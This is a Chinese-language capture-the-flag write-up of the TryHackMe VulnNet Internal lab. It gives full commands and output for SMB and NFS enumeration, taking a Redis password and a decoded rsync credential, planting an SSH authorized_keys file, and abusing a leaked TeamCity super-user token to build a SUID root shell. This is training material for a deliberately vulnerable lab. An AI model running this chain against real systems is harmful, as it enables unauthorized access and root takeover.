

来自 : TryHackMe - VulnNet Internal

IP : 10.48.177.11     

Attacker : Kali 

## 信息收集

Nmap信息收集

```
nmap -T4 -F -A 10.48.177.11          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 08:46 +0800
Nmap scan report for 10.48.177.11
Host is up (0.13s latency).
Not shown: 94 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:52:68:9a:8c:16:65:3c:f3:33:9e:f5:61:f5:a1:b6 (RSA)
|   256 0e:1f:07:96:f3:38:99:31:12:b6:3b:37:bb:57:5a:16 (ECDSA)
|_  256 ef:a6:c2:13:a2:e8:f0:a7:de:a1:3b:85:37:f4:e6:7b (ED25519)
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
873/tcp  open  rsync       (protocol version 31)
2049/tcp open  nfs_acl     3 (RPC #100227)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/31%OT=22%CT=7%CU=41900%PV=Y%DS=3%DC=T%G=Y%TM=69CB199
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=4%ISR=10B%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=108%G
OS:CD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4
OS:E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3
OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: IP-10-48-177-11, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-03-31T00:47:17
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   125.27 ms 192.168.128.1
2   ...
3   125.70 ms 10.48.177.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.79 seconds

```

```
nmap -T4 -sV -Pn 10.48.177.11
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 08:48 +0800
Nmap scan report for 10.48.177.11
Host is up (0.13s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
111/tcp  open     rpcbind     2-4 (RPC #100000)
139/tcp  open     netbios-ssn Samba smbd 4
445/tcp  open     netbios-ssn Samba smbd 4
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs_acl     3 (RPC #100227)
9090/tcp filtered zeus-admin
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.73 seconds

```

发现了445端口开启, 尝试进行登录利用, 进一步获取敏感信息

```
smbclient -L //10.48.177.11/ -N   

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (ip-10-48-177-11 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.48.177.11 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

```

```
smbclient //10.48.177.11/shares

Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 17:20:09 2021
  ..                                  D        0  Tue Feb  2 17:28:11 2021
  temp                                D        0  Sat Feb  6 19:45:10 2021
  data                                D        0  Tue Feb  2 17:27:33 2021

                15376180 blocks of size 1024. 2022696 blocks available
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 17:27:33 2021
  ..                                  D        0  Tue Feb  2 17:20:09 2021
  data.txt                            N       48  Tue Feb  2 17:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 17:27:33 2021

                15376180 blocks of size 1024. 2022696 blocks available
smb: \data\> get data.txt 
getting file \data\data.txt of size 48 as data.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \data\> get business-req.txt 
getting file \data\business-req.txt of size 190 as business-req.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 19:45:10 2021
  ..                                  D        0  Tue Feb  2 17:20:09 2021
  services.txt                        N       38  Sat Feb  6 19:45:09 2021

                15376180 blocks of size 1024. 2022696 blocks available
smb: \temp\> get services.txt 
getting file \temp\services.txt of size 38 as services.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \temp\> 

```

在 services.txt中发现了 service.txt 的flag

```
$ cat services.txt             
THM{0a09d51e488f5fa105d8d866a497440a}
```

在nmap的扫描中发现了 2049 端口的 nfs_acl 服务, 尝试使用 showmount 查询 NFS,  并发现了 redis 服务

```
┌──(kali㉿kali)-[~/Tools/openvpn]
└─$ showmount -e 10.48.177.11      
Export list for 10.48.177.11:
/opt/conf *
      
┌──(kali㉿kali)-[~/Tools/openvpn]
└─$ sudo mkdir /mnt/nfs               
      
┌──(kali㉿kali)-[~/Tools/openvpn]
└─$ sudo mount -t nfs 10.48.177.11:/opt/conf /mnt/nfs
  
┌──(kali㉿kali)-[~/Tools/openvpn]
└─$ cd /mnt/nfs                     
 
┌──(kali㉿kali)-[/mnt/nfs]
└─$ ls    
hp  init  opt  profile.d  redis  vim  wildmidi
          
┌──(kali㉿kali)-[/mnt/nfs]
└─$ cd redis
             
┌──(kali㉿kali)-[/mnt/nfs/redis]
└─$ ls
redis.conf
```

查看 redis.conf 文件中是否存在敏感信息

```
┌──(kali㉿kali)-[/mnt/nfs/redis]
└─$ strings redis.conf| grep -i "pass"
# 2) No password is configured.
# If the master is password protected (using the "requirepass" configuration
# masterauth <master-password>
requirepass "B65Hx562F@ggAZ@F"
# resync is enough, just passing the portion of data the slave missed while
# Require clients to issue AUTH <PASSWORD> before processing any other
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
# requirepass foobared

```

尝试进行 redis 登录查询

```
redis-cli -h 10.48.177.11 
10.48.177.11:6379> AUTH B65Hx562F@ggAZ@F
OK
10.48.177.11:6379> keys *
1) "int"
2) "internal flag"
3) "marketlist"
4) "tmp"
5) "authlist"
10.48.177.11:6379> get "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
10.48.177.11:6379> LRANGE authlist 0 -1
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
10.48.177.11:6379> 

```

针对 authlist 内容的解码分析

```
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

尝试查询从 authlist 中找到的信息 

```
┌──(kali㉿kali)-[/mnt/nfs/redis]
└─$ rsync --list-only rsync://rsync-connect@10.48.177.11/files                                                                                     
Password: 
drwxr-xr-x          4,096 2026/03/31 08:44:50 .
drwxr-xr-x          4,096 2025/06/29 00:16:36 ssm-user
drwxr-xr-x          4,096 2021/02/06 20:49:29 sys-internal
drwxr-xr-x          4,096 2026/03/31 08:44:50 ubuntu

┌──(kali㉿kali)-[/mnt/nfs/redis]
└─$ rsync --list-only rsync://rsync-connect@10.48.177.11/files/sys-internal
Password: 
drwxr-xr-x          4,096 2021/02/06 20:49:29 sys-internal
    
┌──(kali㉿kali)-[/mnt/nfs/redis]
└─$ rsync rsync://rsync-connect@10.48.177.11/files/sys-internal/
Password: 
drwxr-xr-x          4,096 2021/02/06 20:49:29 .
-rw-------             61 2021/02/06 20:49:28 .Xauthority
lrwxrwxrwx              9 2021/02/01 21:33:19 .bash_history
-rw-r--r--            220 2021/02/01 20:51:14 .bash_logout
-rw-r--r--          3,771 2021/02/01 20:51:14 .bashrc
-rw-r--r--             26 2021/02/01 20:53:18 .dmrc
-rw-r--r--            807 2021/02/01 20:51:14 .profile
lrwxrwxrwx              9 2021/02/02 22:12:29 .rediscli_history
-rw-r--r--              0 2021/02/01 20:54:03 .sudo_as_admin_successful
-rw-r--r--             14 2018/02/13 03:09:01 .xscreensaver
-rw-------          2,546 2021/02/06 20:49:35 .xsession-errors
-rw-------          2,546 2021/02/06 19:40:13 .xsession-errors.old
-rw-------             38 2021/02/06 19:54:25 user.txt
drwxrwxr-x          4,096 2021/02/02 17:23:00 .cache
drwxrwxr-x          4,096 2021/02/01 20:53:57 .config
drwx------          4,096 2021/02/01 20:53:19 .dbus
drwx------          4,096 2021/02/01 20:53:18 .gnupg
drwxrwxr-x          4,096 2021/02/01 20:53:22 .local
drwx------          4,096 2021/02/01 21:37:15 .mozilla
drwxrwxr-x          4,096 2021/02/06 19:43:14 .ssh
drwx------          4,096 2021/02/02 19:16:16 .thumbnails
drwx------          4,096 2021/02/01 20:53:21 Desktop
drwxr-xr-x          4,096 2021/02/01 20:53:22 Documents
drwxr-xr-x          4,096 2021/02/01 21:46:46 Downloads
drwxr-xr-x          4,096 2021/02/01 20:53:22 Music
drwxr-xr-x          4,096 2021/02/01 20:53:22 Pictures
drwxr-xr-x          4,096 2021/02/01 20:53:22 Public
drwxr-xr-x          4,096 2021/02/01 20:53:22 Templates
drwxr-xr-x          4,096 2021/02/01 20:53:22 Videos

```

发现了user.txt文件

下载后, 查看得到了 user.txt 内的flag

```
┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ rsync -av rsync://rsync-connect@10.48.177.11/files/sys-internal/user.txt ./
Password: 
receiving incremental file list
user.txt

sent 43 bytes  received 134 bytes  18.63 bytes/sec
total size is 38  speedup is 0.21
         
┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ ls
business-req.txt  data.txt  services.txt  user.txt
    
┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ cat user.txt    
THM{da7c20696831f253e0afaca8b83c07ab}
```

## 初始立足点建立

创建一个test文件, 尝试使用 rsync 上传

发现了能够实现上传

于是, 一条潜在的利用路线, 上传Kali的ssh密钥来实现ssh登录

```
┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ touch test
      
┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ rsync -av test rsync://rsync-connect@10.48.177.11/files/sys-internal/.ssh
Password: 
sending incremental file list
test

sent 100 bytes  received 35 bytes  38.57 bytes/sec
total size is 0  speedup is 0.00
    
┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ rsync rsync://rsync-connect@10.48.177.11/files/sys-internal/.ssh 
Password: 
drwxrwxr-x          4,096 2026/03/31 09:10:33 .ssh

┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ rsync rsync://rsync-connect@10.48.177.11/files/sys-internal/.ssh/
Password: 
drwxrwxr-x          4,096 2026/03/31 09:10:33 .
-rw-rw-r--              0 2026/03/31 09:10:27 test

┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ ssh-keygen -f ./id_rsa            

┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ ls
business-req.txt  data.txt  id_rsa  id_rsa.pub  services.txt  test  user.txt

┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ mv id_rsa.pub authorized_keys

┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ rsync -av authorized_keys rsync://rsync-connect@10.48.177.11/files/sys-internal/.ssh/authorized_keys 
Password: 
sending incremental file list
authorized_keys

sent 206 bytes  received 35 bytes  68.86 bytes/sec
total size is 92  speedup is 0.38

┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/Downloads/VulnNet_Internal]
└─$ ssh -i id_rsa sys-internal@10.48.177.11
The authenticity of host '10.48.177.11 (10.48.177.11)' can't be established.
ED25519 key fingerprint is: SHA256:xcJWqSpHsNq8gfVDI9TIriQvVU20cxHBtPmzg14ROy4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.177.11' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

36 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sys-internal@ip-10-48-177-11:~$ 

```

## 漏洞利用与提权

在进行提权的过程中发现了 OverlayFS 已经因为内核升级而被修复, 无法利用

上传 linpeas.sh 脚本, 后发现的 Dirty Pipe (CVE-2022-0847) 漏洞也无法使用 (尝试利用该漏洞后, 会出现报错)

于是尝试检查服务配置错误导致的潜在利用点

检查其他可能运行的服务

```
bash-5.0$ ss -tulpn
Netid              State               Recv-Q              Send-Q                                Local Address:Port                             Peer Address:Port              Process              
udp                UNCONN              0                   0                                           0.0.0.0:39843                                 0.0.0.0:*                                      
udp                UNCONN              0                   0                                           0.0.0.0:48148                                 0.0.0.0:*                                                  
tcp                LISTEN              0                   100                              [::ffff:127.0.0.1]:8111                                        *:*                        
```

发现了8111端口(TeamCity的默认端口)

```
sys-internal@ip-10-48-177-11:~/Documents$ cd /..
sys-internal@ip-10-48-177-11:/$ ls
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swapfile  sys  TeamCity  tmp  usr  var  vmlinuz  vmlinuz.old

sys-internal@ip-10-48-177-11:/TeamCity$ ls
bin  BUILD_85899  buildAgent  conf  devPackage  lib  licenses  logs  service.properties  TeamCity-readme.txt  temp  Tomcat-running.txt  webapps  work
```

并且, 在 /TeamCity/logs 中发现了 catalina.out 文件

```
sys-internal@ip-10-48-177-11:/TeamCity/logs$ cat catalina.out 
=======================================================================
TeamCity initialized, server UUID: 61907dff-244c-4220-b252-31de83974909, URL: http://localhost:8111
TeamCity is running in professional mode
[TeamCity] Super user authentication token: 9134073586048974763 (use empty username with the token as the password to access the server)
[2026-03-31 03:01:04,528]   WARN [8a88a38'; Scheduled executor 4] -   jetbrains.buildServer.UPDATE - Unable to check for TeamCity updates via  URL "https://www.jetbrains.com/teamcity/update.xml": org.apache.http.conn.HttpHostConnectException: Connect to www.jetbrains.com:443 [www.jetbrains.com/18.172.78.116, www.jetbrains.com/18.172.78.37, www.jetbrains.com/18.172.78.12, www.jetbrains.com/18.172.78.52] failed: Connection timed out (Connection timed out) (enable debug to see stacktrace)
[2026-03-31 03:01:04,529]   WARN [8a88a38'; Scheduled executor 4] -   jetbrains.buildServer.UPDATE - Error while checking new TeamCity version: jetbrains.buildServer.updates.ServerUpdateException: Unable to check for updates via URL "https://www.jetbrains.com/teamcity/update.xml": Connect to www.jetbrains.com:443 [www.jetbrains.com/18.172.78.116, www.jetbrains.com/18.172.78.37, www.jetbrains.com/18.172.78.12, www.jetbrains.com/18.172.78.52] failed: Connection timed out (Connection timed out) (enable debug to see stacktrace)
[TeamCity] Super user authentication token: 9134073586048974763 (use empty username with the token as the password to access the server)

```

找到了一个Super User 的验证token 9134073586048974763

```
ssh -L 8111:127.0.0.1:8111 sys-internal@10.48.177.11 -i id_rsa

sys-internal@ip-10-48-177-11:~$ ls 
```

其中 `ssh -L 8111:127.0.0.1:8111 sys-internal@10.48.177.11 -i id_rsa` 创建了代理隧道, 使得Kali能够通过本地浏览器打开 `http://127.0.0.1:8111` , 进而访问TeamCity服务

而Team City允许攻击者使用Super User的身份(需要使用之前找到的token实现认证)

进入了TeamCity后, 可以创建一个新的Project和Build Configuration

在Build Step中添加 Command Line步骤, 内容写成

```
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
```

之后选择运行,在SSH窗口执行, 实现了root提权

```
sys-internal@ip-10-48-177-11:/TeamCity$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(sys-internal) gid=1000(sys-internal) euid=0(root) egid=0(root) groups=0(root),24(cdrom),1000(sys-internal)
rootbash-5.0# cd /root
rootbash-5.0# ls
root.txt
rootbash-5.0# cat root.txt
THM{e8996faea46df09dba5676dd271c60bd}
rootbash-5.0# 
```

## 总结

VulnNet Internal靶场是在无对外Web服务, 仅有端口的情况下, 因为内网服务的配置错误导致的攻击利用

内部能够实现Overlay FS漏洞利用的手段, 即使在升级内核后(靶机的内核进行了升级, 以往靶机的内核版本为5.4, 而升级后的内核版本为 5.15, 成功阻止了Overlay FS漏洞以及linpeas.sh扫描出的Dirty Pipe漏洞的利用)

但是内网环境中的错误配置与敏感信息泄露,反而提供了其他的利用途径, 特别是TeamCity的Super User token泄漏, 使得攻击者能够利用该途径创建系的提权利用方式, 成功绕过了内核升级带来系统漏洞利用失效方案的阻拦